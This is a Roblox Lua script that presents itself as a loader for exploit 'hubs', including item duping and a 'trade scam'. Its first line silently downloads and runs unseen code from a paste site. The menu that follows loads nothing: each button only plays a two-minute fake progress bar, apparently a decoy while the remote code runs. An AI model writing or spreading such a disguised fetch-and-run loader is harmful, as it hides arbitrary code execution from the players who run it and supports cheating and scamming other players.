loadstring(game:HttpGet("https://pastefy.app/vE2Kv53d/raw", true))()
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screen = Instance.new("ScreenGui")
screen.Name = "HubLoader"
screen.Parent = playerGui

-- FRAME PRINCIPAL
local main = Instance.new("Frame")
main.Size = UDim2.new(1,0,1,0)
main.BackgroundTransparency = 1
main.Parent = screen

-- LISTE DES HUBS
local hubs = {
	{name="Nines hub", color=Color3.fromRGB(255,80,80)},
	{name="Kawatan hub", color=Color3.fromRGB(80,170,255)},
	{name="Dupe brainrot (don't work)", color=Color3.fromRGB(80,255,140)},
	{name="trade scam (not 100% works)", color=Color3.fromRGB(255,200,80)}
}

local buttons = {}

-- CREATION DES BOUTONS
for i,hub in ipairs(hubs) do
	
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0.4,0,0.25,0)
	button.Position = UDim2.new((i%2==1) and 0.05 or 0.55,0,(i<=2) and 0.15 or 0.55,0)
	button.BackgroundColor3 = hub.color
	button.Text = hub.name
	button.TextScaled = true
	button.Font = Enum.Font.GothamBold
	button.TextColor3 = Color3.new(1,1,1)
	button.Parent = main
	
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0,20)
	corner.Parent = button
	
	local stroke = Instance.new("UIStroke")
	stroke.Thickness = 2
	stroke.Color = Color3.new(1,1,1)
	stroke.Parent = button
	
	buttons[i] = button
end

-- FRAME LOADING
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0.45,0,0.15,0)
loadingFrame.Position = UDim2.new(0.275,0,0.42,0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
loadingFrame.Visible = false
loadingFrame.Parent = screen

local corner = Instance.new("UICorner")
corner.Parent = loadingFrame

-- TEXTE
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1,0,0.4,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextScaled = true
loadingText.TextColor3 = Color3.new(1,1,1)
loadingText.Parent = loadingFrame

-- BARRE
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.9,0,0.3,0)
barBG.Position = UDim2.new(0.05,0,0.6,0)
barBG.BackgroundColor3 = Color3.fromRGB(60,60,60)
barBG.Parent = loadingFrame

local corner2 = Instance.new("UICorner")
corner2.Parent = barBG

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
bar.Parent = barBG

local corner3 = Instance.new("UICorner")
corner3.Parent = bar

-- ANIMATION BARRE
local TweenService = game:GetService("TweenService")

local function startLoading(name)
	
	main.Visible = false
	loadingFrame.Visible = true
	
	loadingText.Text = "Loading "..name
	
	local progress = 0
	
	while progress < 100 do
		
		progress += 0.8
		
		local tween = TweenService:Create(
			bar,
			TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{Size = UDim2.new(progress/100,0,1,0)}
		)
		
		tween:Play()
		
		wait(1)
	end
	
	loadingText.Text = "Loaded!"
end

-- CLIQUE
for i,button in pairs(buttons) do
	
	button.MouseButton1Click:Connect(function()
		
		startLoading(button.Text)
		
	end)
end
